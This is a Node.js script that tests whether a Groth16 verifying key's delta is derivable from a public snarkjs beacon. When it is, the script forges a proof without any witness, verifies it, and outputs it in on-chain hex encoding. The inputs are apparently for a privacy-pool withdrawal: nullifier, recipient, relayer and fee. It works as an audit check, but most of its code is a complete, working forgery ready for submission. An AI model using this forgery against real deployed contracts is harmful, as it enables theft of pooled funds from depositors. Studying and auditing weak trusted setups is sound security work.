#!/usr/bin/env node
/**
 * Check whether a Groth16 verifying key's delta is derivable from public data.
 *
 * snarkjs `zkey beacon` derives its phase-2 scalar from the beacon value alone:
 * sha256 iterated 2^iterExp times, the digest seeds ChaCha, and the initial Fr draw is
 * the scalar that multiplies delta. When every phase-2 step of a key is a public
 * beacon applied to `groth16 setup` output (delta = 1), delta is a public scalar and
 * proofs can be forged for any public inputs:
 *
 *   A = alpha_1, B = beta_2, C = -(vk_x) / delta      (snarkjs keys have gamma_2 = g2)
 *
 * so e(A,B) = e(alpha,beta) e(vk_x,gamma) e(C,delta) holds without a witness.
 *
 * This script recomputes the scalar from the beacon parameters and compares
 * scalar * g2 with vk_delta_2. On a match it builds the forged proof for the given
 * public inputs and checks it with snarkjs groth16 verify. On a mismatch (a key
 * with a secret contribution in its chain) it reports that delta is not derivable.
 *
 * Usage (run where snarkjs 0.7.5 resolves):
 *   node check-beacon-delta.mjs --vk <vk.json> --beacon <hex> --iter <exp>
 *        [--public <json array of decimal strings>] [--out <proof.json>]
 * Exit code: 0 = delta NOT derivable from the beacon; 3 = derivable and the forged
 * proof verifies; 1 = error or derivable but the forged proof did not verify.
 */
import { readFileSync, writeFileSync } from "node:fs";
import { createHash, randomBytes } from "node:crypto";
import { buildBn128, ChaCha } from "ffjavascript";
import * as snarkjs from "snarkjs";

const arg = (n, d) => { const i = process.argv.indexOf("--" + n); return i !== -1 ? process.argv[i + 1] : d; };
const vkPath = arg("vk");
const beaconHex = arg("beacon");
const iterExp = parseInt(arg("iter", "10"), 10);
if (!vkPath || !beaconHex) { console.error("usage: --vk <vk.json> --beacon <hex> --iter <exp> [--public <json>] [--out <file>]"); process.exit(1); }

const vk = JSON.parse(readFileSync(vkPath, "utf8"));
const curve = await buildBn128(true);
const { Fr, G1, G2 } = curve;
const str = (o) => JSON.stringify(o, (_, v) => (typeof v === "bigint" ? v.toString() : v));
const g1Obj = (p) => G1.toObject(G1.toAffine(p)).map(String);
const g2Obj = (p) => G2.toObject(G2.toAffine(p)).map((c) => c.map(String));
const g1From = (o) => G1.fromObject(o.map(BigInt));
const g2From = (o) => G2.fromObject(o.map((c) => c.map(BigInt)));

// 1. beacon -> scalar (same steps as snarkjs misc.rngFromBeaconParams + zkey_beacon)
let h = Buffer.from(beaconHex, "hex");
for (let i = 0; i < 2 ** iterExp; i++) h = createHash("sha256").update(h).digest();
const seed = [];
for (let i = 0; i < 8; i++) seed.push(h.readUInt32BE(i * 4));
const d = Fr.fromRng(new ChaCha(seed));

// 2. compare with the key
const gammaIsG2 = str(vk.vk_gamma_2) === str(g2Obj(G2.g));
const derived = g2Obj(G2.timesFr(G2.g, d));
const deltaMatches = str(derived) === str(vk.vk_delta_2);
console.log(`vk:                 ${vkPath}`);
console.log(`gamma_2 == g2:      ${gammaIsG2}`);
console.log(`beacon:             ${beaconHex} (2^${iterExp} sha256 iterations)`);
console.log(`delta == beacon*g2: ${deltaMatches}`);
if (!deltaMatches) {
  console.log("RESULT: delta is NOT derivable from this beacon alone");
  process.exit(0);
}

// 3. forge for the given public inputs (default: random field elements)
const nPub = vk.nPublic;
const rnd = () => (BigInt("0x" + randomBytes(32).toString("hex")) % Fr.p).toString();
const pub = arg("public") ? JSON.parse(arg("public")) : Array.from({ length: nPub }, rnd);
if (pub.length !== nPub) throw new Error(`public input count ${pub.length} != nPublic ${nPub}`);
let vkx = g1From(vk.IC[0]);
for (let i = 0; i < nPub; i++) vkx = G1.add(vkx, G1.timesFr(g1From(vk.IC[i + 1]), Fr.e(pub[i])));
const C = G1.neg(G1.timesFr(vkx, Fr.inv(d)));
const proof = {
  pi_a: g1Obj(g1From(vk.vk_alpha_1)),
  pi_b: g2Obj(g2From(vk.vk_beta_2)),
  pi_c: g1Obj(C),
  protocol: "groth16",
  curve: "bn128",
};
const ok = await snarkjs.groth16.verify(vk, pub, proof);
console.log(`forged proof, snarkjs groth16 verify: ${ok ? "OK" : "INVALID"}`);

// on-chain encoding used by build/zk/prove-v3.mjs (EIP-197, G2 as x_im, x_re, y_im, y_re)
const be = (x) => BigInt(x).toString(16).padStart(64, "0");
const proof256Hex =
  be(proof.pi_a[0]) + be(proof.pi_a[1]) +
  be(proof.pi_b[0][1]) + be(proof.pi_b[0][0]) + be(proof.pi_b[1][1]) + be(proof.pi_b[1][0]) +
  be(proof.pi_c[0]) + be(proof.pi_c[1]);
const names = ["nullifier", "merkleRoot", "recipient", "poolId", "relayer", "fee", "denomination"];
const publicInputsHex = Object.fromEntries(pub.map((v, i) => [names[i] ?? `in${i}`, be(v)]));
if (arg("out")) writeFileSync(arg("out"), JSON.stringify({ forged: true, proof, publicSignalsDec: pub, proof256Hex, publicInputsHex }, null, 2) + "\n");
console.log(ok ? "RESULT: delta derivable from public data; forged proof verifies" : "RESULT: delta derivable, forged proof did not verify");
await curve.terminate();
process.exit(ok ? 3 : 1);
